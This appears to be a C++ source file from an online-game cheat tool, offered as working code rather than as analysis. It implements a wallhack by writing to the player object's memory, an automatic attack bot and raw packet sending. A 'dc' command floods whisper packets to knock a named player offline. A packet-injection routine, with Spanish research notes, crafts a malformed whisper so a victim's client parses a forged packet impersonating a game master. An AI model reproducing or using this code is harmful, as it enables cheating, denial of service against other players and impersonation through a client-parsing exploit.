#include <iostream>
#include <string>
#include <vector>

#include "cmd.h"
#include "utils.h"
#include "hooks.h"
#include "packet.h"


using namespace std;

const map<string, string> Command::help_msgs = {
	{"send", "Sends the packet built with the hexbuf. Syntax: send hexbuf"},
	{"move", "Moves to coords (x, y). Syntax: move type x y"},
	{"attack", "Attacks the target. Syntax: attack"},
	{"msg", "Send a message. Syntax: msg type message"},
	{"wallhack", "Enables or disables the wallhack. Syntax: wallhack 0/1"}
};
Command* const Command::instance = new Command();

void Command::set_id_attack(uint id_attack) {
	instance->id_attack = id_attack;
	print("New ID selected: " + to_string(id_attack));
}

uint Command::get_id_attack() {
	return instance->id_attack;
}

void Command::update_enemy(uint id, int x, int y){
	if (instance->enemies.count(id)){
		instance->enemies[id].x = x;
		instance->enemies[id].y = y;
	} else {
		Enemy en = {x, y};
		instance->enemies[id] = en;
	}

	/*cout << endl << "{";
	for (auto it : instance->enemies){
		cout << it.first << ": (" << it.second.x << ", " << it.second.y << "), ";
	}
	cout << "}" << endl << endl;*/
}


bool Command::check_n_args(uint n, const vector<string>& cmd){
	return cmd.size() >= n+1;
}

void Command::help(){
	string msg = "Available help pages: ";
	for (auto p : help_msgs)
		msg += p.first + ", ";
	msg.erase(msg.end()-2, msg.end()); // remove last ", "
	print(msg);
}

void Command::help(const string& what){
	auto it = help_msgs.find(what);
	if (it != help_msgs.end())
		print_help(it->first, it->second);
	else
		print_err("No help page for " + what);
}

void Command::send(const string& hexbuf){
	Packet p(hex_to_string(hexbuf));
	p.send();
}

void Command::move(byte type, int x, int y){
	CG_Move p(type, 0, 0xc, x, y, 0);
	p.send();
}

void Command::attack_target(){
	if (instance->id_attack){
		CG_Attack p(0, instance->id_attack);
		p.send();
	} else print_err("There's no target.");
}

void Command::_attack(){
	while (instance->attacking){
		for (auto it : instance->enemies){
			cout << "[BOT] Attacking " << it.first << endl;
			CG_Attack p(0, it.first);
			p.send();
			Sleep(50);
		}
	}
}

void Command::attack(bool enabled){
	instance->attacking = enabled;
	if (enabled)
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_attack, 0, 0, 0);
}

string Command::process_msg(string msg){
	msg = replace_all(msg, "||", "|");
	size_t i1 = msg.find("["), i2, len;
	//string replace = "";
	while (i1 != msg.npos){
		i2 = msg.find("]");
		if (i2 == msg.npos)
			break;
		len = i2-i1-1;
		if (len == 0)
			msg.replace(i1, len + 2, color());
		else if (len == 6)
			msg.replace(i1, len + 2, color(msg.substr(i1 + 1, len)));
		else
			print_err("Error processing color tag in message");
		//msg.replace(i1, len+2, replace);
		i1 = msg.find("[", i1+1);
	}
	return msg;
}

void Command::msg(byte type, const string& msg){
	CG_Chat p(type, msg);
	p.send();
}

void Command::set_wallhack(bool enabled){
	// TODO: player structure PL0X
	*(byte*)((DWORD)addr::PlayerObject + 0x490) = (byte)enabled;
	print(string("Set wallhack ") + (enabled ? "on." : "off."));
}

void Command::_packet_injection(){
	/*
	[INVESTIGACION]
	Si se pone breakpoint en parse_recv_whisper y se van viendo llegar los paquetes no ocurre el bug.
	Lo actual funciona, se llama a la función que debe parsear el paquete malicioso, pero luego peta
	porque el paquete siguiente no es válido.
	Sin embargo si se quita el paquete siguiente no ocurre el bug. Probar a meter un paquete valido.

	Con un paquete de whisper de longitud 500 después parece que se lo traga.
	PROBLEMA: no puedo meter nullbytes.

	Probar a meter nullbytes con otros paquetes. Aunque parece demasiado locura.

	Paquetes sin nullbytes:
	whisper
	TPacketGCItemDel (HEADER_GC_SAFEBOX_DEL o HEADER_GC_MALL_DEL)
	TPacketGCPhase
	puede que chat
	puede que TPacketGCPoints (HEADER_GC_CHARACTER_POINTS), pero no soy capaz de recibirlo
	HEADER_GC_QUICKSLOT_ADD, HEADER_GC_QUICKSLOT_DEL, HEADER_GC_QUICKSLOT_SWAP
	puede que TPacketGCShop
	puede que TPacketGCDuelStart
	puede que TPacketGCWarp? comprobar en OX
	TPacketGCGuild
	TPacketGCChangeSkillGroup
	TPacketGCNPCPosition puede estar gracioso
	TPacketGCTargetCreate: si consigo crear un target con un id sin nullbytes puedo hacer muchas cosas
	TPacketGCLoverInfo, TPacketGCLovePointUpdate XD
	*/
	cout << "Performing packet injection to " << instance->username_dc << endl;
	int i;
	char c = '\xE1';
	
	string buf;
	// padding
	for (i = 0; i < 8; i++)
		buf += CG_Whisper(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, c++) + to_string(i)).get_buf();

	// packet
	string username = "Lord Klecko";
	string msg = "ola zoi un gm";

	username += string(25 - username.length(), ' ');
	msg += string(0x101 - 25 - 4 - msg.length(), ' ');
	string packet = GC_Whisper(5, username, msg).get_buf();
	cout << "[MALICIOUS PACKET] " << string_to_hex(packet) << endl;																								   //string packet = hex_to_string("222101014B6C65636B616161616161616161616161616161616161616141414141");
	buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf(); // string(500-78-packet.length(), c++) + to_string(i)).get_buf();

	// Valid packet after malicious packet
	c++;
	i++;
	buf += CG_Whisper(instance->username_dc, to_string(i) + string(200, c++) + to_string(i)).get_buf();
	//buf += CG_Whisper(instance->username_dc, to_string(i) + string(78, c) + packet).get_buf();

	Packet p(buf);
	p.send();
}

void Command::_disconnect() {
	// Igual se puede hacer gradual comprobando si el pj se ha desconectado o no
	cout << "[BOT] Sending " << instance->disconnect_packets << " packets to disconnect " << instance->username_dc << endl;
	char c = 'a';
	int i = 0;
	while (instance->disconnecting && i < instance->disconnect_packets) {
		//cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
		CG_Whisper p(instance->username_dc, to_string(i) + string(DISCONNECT_PACKET_LEN, DISCONNECT_BYTE) + to_string(i));
		p.send();
		//Sleep(1);
		i++;
	}
	instance->disconnecting = false;
}

void Command::disconnect(const string& username, int n_packets){
	instance->username_dc = username;
	instance->disconnect_packets = n_packets;
	if (!instance->disconnecting){
		instance->disconnecting = true;
		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_disconnect, 0, 0, 0);
	}
}

void Command::packet_injection(const string& username){
	instance->username_dc = username;
	_packet_injection();
}

void Command::run(const string& _cmd){
	bool check = true;
	vector<string> cmd = split(_cmd, ' ');
	if (!check_n_args(0, cmd)) // Avoid empty commands
		return;

	if (cmd[0] == "help") {
		if (check_n_args(0, cmd)) // 0 args
			help();
		else if (check = check_n_args(1, cmd)) // 1 arg
			help(cmd[1]);

	} else if (cmd[0] == "move") {
		if (check = check_n_args(3, cmd))
			move(stoi(cmd[1]), stoi(cmd[2]), stoi(cmd[3]));

	} else if (cmd[0] == "attack_target") {
		if (check = check_n_args(0, cmd))
			attack_target();

	} else if (cmd[0] == "attack") { // 1 arg that must be start or stop
		if ((check = check_n_args(1, cmd)) && (check = (cmd[1] == "start" || cmd[1] == "stop")))
			attack(cmd[1] == "start" ? true : false);
	
	} else if (cmd[0] == "msg"){
		if (check = check_n_args(2, cmd))
			msg(stoi(cmd[1]), cmd[2]);

	} else if (cmd[0] == "send"){
		if (check = check_n_args(1, cmd))
			send(cmd[1]);

	} else if (cmd[0] == "wallhack"){
		if (check = check_n_args(1, cmd)){

			set_wallhack((bool)stoi(cmd[1]));
		}

	} else if (cmd[0] == "shoot"){
		// TESTING
		string buf("\x33");
		buf += p32(instance->id_attack);
		buf += string("\x70\xa3\x0e\x00\x71\x81\x02\x00\x00", 9);
		string buf2("\x36\x00\x00", 3);
		Packet p1(buf);
		Packet p2(buf2);
		p1.send();
		p2.send();

	} else if (cmd[0] == "dc"){
		if (check = check_n_args(1, cmd))
			if (check_n_args(2, cmd))
				disconnect(cmd[1], stoi(cmd[2]));
			else
				disconnect(cmd[1]);

	} else if (cmd[0] == "dc_stop"){
		instance->disconnecting = false;

	}
	else if (cmd[0] == "inj") {
		if (check = check_n_args(1, cmd))
			packet_injection(cmd[1]);

	} else print_err("Unknown command: " + cmd[0]);

	if (!check)
		print_err("Bad arguments!");
}